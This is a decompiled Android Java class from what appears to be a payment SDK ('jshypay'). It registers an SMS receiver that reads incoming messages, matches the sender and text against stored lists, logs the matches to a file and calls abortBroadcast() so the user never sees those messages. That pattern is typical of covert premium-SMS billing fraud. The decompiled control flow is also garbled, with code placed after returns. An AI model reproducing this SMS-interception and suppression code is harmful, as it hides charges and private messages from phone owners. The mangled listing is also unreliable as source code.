package com.jshymedia.jshypay.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.jshymedia.jshypay.ztool.Zlog;
import java.util.HashSet;
import java.util.Iterator;

final class a
  extends BroadcastReceiver
{
  a(SysService paramSysService) {}
  
  private static boolean a(String paramString1, String paramString2)
  {
    Object localObject = SysService.a().iterator();
    if (!((Iterator)localObject).hasNext()) {
      paramString2 = SysService.b().iterator();
    }
    do
    {
      if (!paramString2.hasNext())
      {
        return false;
        String str = (String)((Iterator)localObject).next();
        Zlog.syso("Del_Port:" + str);
        if (paramString2.indexOf(str) == -1) {
          break;
        }
        return true;
      }
      localObject = (String)paramString2.next();
      Zlog.syso("Del_Info:" + (String)localObject);
    } while (paramString1.indexOf((String)localObject) == -1);
    return true;
  }
  
  public final void onReceive(Context paramContext, Intent paramIntent)
  {
    Zlog.syso("Sms..Receive");
    Object localObject;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      localObject = (Object[])paramIntent.getExtras().get("pdus");
      if (localObject != null) {}
    }
    else
    {
      return;
    }
    paramIntent = new SmsMessage[localObject.length];
    StringBuffer localStringBuffer = new StringBuffer();
    int i = 0;
    for (;;)
    {
      if (i >= paramIntent.length)
      {
        localObject = localStringBuffer.toString();
        paramIntent = paramIntent[0].getDisplayOriginatingAddress();
        if (!(a((String)localObject, paramIntent) | SysService.a(this.a, paramIntent, (String)localObject, paramContext))) {
          break;
        }
        Zlog.writeLog(paramContext, "Sms.txt", "sms", "msg:" + (String)localObject + ",port:" + paramIntent, 0);
        abortBroadcast();
        return;
      }
      paramIntent[i] = SmsMessage.createFromPdu((byte[])localObject[i]);
      localStringBuffer.append(paramIntent[i].getDisplayMessageBody());
      i += 1;
    }
  }
}
